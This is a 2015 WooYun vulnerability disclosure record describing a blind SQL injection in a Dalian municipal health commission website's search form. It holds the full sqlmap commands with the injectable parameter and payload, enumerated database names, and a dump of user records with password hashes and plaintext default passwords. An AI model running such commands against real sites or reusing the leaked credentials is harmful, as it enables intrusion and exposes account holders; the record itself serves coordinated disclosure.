{"id": 84420, "wybug_id": "wooyun-2015-0144877", "wybug_title": "大连市卫计委官网sql注射导致数据库泄露", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "编程浪子", "wybug_date": "2015-10-09 22:12", "wybug_open_date": "2015-11-28 08:28", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "盲注"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-28：\t细节向公众公开  简要描述： 网站搜索功能过滤不严，导致sql布尔盲注，泄露数据库内容 详细说明：  注入点：python sqlmap.py -u \"http://**.**.**.**/web/guest/home?p_p_id=keyword_search&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&_keyword_search_struts_action=%2Fkeyword_search%2Fview\" --data \"_keyword_search_typevalue=all&_keyword_search_flag=search&_keyword_search_searchContent=2015\" -p _keyword_search_searchContent -v 3sqlmap resumed the following injection point(s) from stored session:---Parameter: _keyword_search_searchContent (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: _keyword_search_typevalue=all&_keyword_search_flag=search&_keyword_search_searchContent=2015%' AND 1450=1450 AND '%'='    Vector: AND [INFERENCE]---web application technology: JSPback-end DBMS: Oracle   漏洞证明：  --dbs 得到库名available databases [6]:[*] PHIS_WEBHIS           //似乎是个空库[*] SYS[*] SYSTEM[*] WJWOA                 //卫计委OA数据库，似乎是内网办公用[*] WJWWZ                 //卫计委网站数据库，对外门户网站用的数据库[*] WMSYS--dump 到的一些数据，用于漏洞证明python sqlmap.py -u \"http://**.**.**.**/web/guest/home?p_p_id=keyword_search&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&_keyword_search_struts_action=%2Fkeyword_search%2Fview\" --data \"_keyword_search_typevalue=all&_keyword_search_flag=search&_keyword_search_searchContent=2015\" -p _keyword_search_searchContent --batch -D WJWWZ -T USER_ --stop 5 --dump  --threads 8 -v 3Database: WJWWZTable: USER_[5 entries]+--------------------------------------+---------+------------+---------------------+-------------------------+-----------------------------------+---------------------------+------------------------------+-------------------+---------------------------+------------+----------+| UUID_                                | USERID  | SCREENNAME | REMINDERQUERYANSWER | REMINDERQUERYANSWER_NEW | REMINDERQUERYQUESTION             | REMINDERQUERYQUESTION_NEW | PASSWORD_                    | PASSWORDENCRYPTED | EMAILADDRESS              | FIRSTNAME  | LASTNAME |+--------------------------------------+---------+------------+---------------------+-------------------------+-----------------------------------+---------------------------+------------------------------+-------------------+---------------------------+------------+----------+| 0ffad13f-a5e4-4e62-bd51-7cd4b277ce9d | 12112   | 12112      | NULL                | NULL                    | NULL                              | NULL                      | password                     | 0                 | default@**.**.**.** | NULL       | NULL     || d685193d-20df-4d1d-bb5d-734b0c29fac6 | 12141   | hhcb       | d                   | NULL                    | what-is-your-father's-middle-name | NULL                      | zVEXg2xuSX5TphJIhUQ18s/S5+M= | 1                 | test@**.**.**.**    | Test       | Test     || 42f9e7e5-83a5-4e1d-b947-cc2310bd7e24 | 1133943 | wjw        | today               | NULL                    | what-is-your-father's-middle-name | NULL                      | Xv4Dwkq76ih/6msk7RddtQNURYc= | 1                 | today@**.**.**.**           | \\\\?b9\\\\?dc | Ա        || 72f6fd95-de42-45d2-9208-2c134b664b57 | 1205078 | 1205078    | NULL                | NULL                    | NULL                              | NULL                      | password                     | 0                 | default@**.**.**.**     | NULL       | NULL     || 1e102e52-b6de-4f65-a298-c58c9af56661 | 1205107 | admin      | NULL                | NULL                    | NULL                              | NULL                      | qUqP5cyxm6YcTAhz05Hph5gvu9M= | 1                 | admin@**.**.**.**       | Admin      | Hu       |+--------------------------------------+---------+------------+---------------------+-------------------------+-----------------------------------+---------------------------+------------------------------+-------------------+---------------------------+------------+----------+   修复方案：  单引号过滤   版权声明：转载请注明来源 编程浪子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-10-14 08:26 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给辽宁分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}